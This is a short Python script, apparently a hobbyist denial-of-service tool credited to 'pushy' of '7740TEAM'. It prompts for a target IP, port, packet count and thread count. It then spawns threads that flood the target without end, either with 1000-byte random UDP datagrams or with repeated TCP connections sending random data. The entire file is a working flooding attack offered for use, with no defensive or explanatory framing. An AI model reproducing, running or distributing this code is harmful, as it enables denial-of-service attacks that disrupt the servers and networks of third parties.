#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print(" ==> ################################### <==  \n")
print(" ==> ### AUTOR : pushy CODE : 7740TEAM ### <==  \n")
print(" ==> ################################### <==  \n")
print(" ==> ### AWAS YOO YANG CURI SCRIPT ##### <==  \n")
print(" ==> ################################### <==  \n")

ip = str(input("  Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Attack Server?(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PACKETS pushy ")
		except:
			print("[!] BOOM !!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PACKETS pushy ")
		except:
			s.close()
			print("[*] BOOM !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
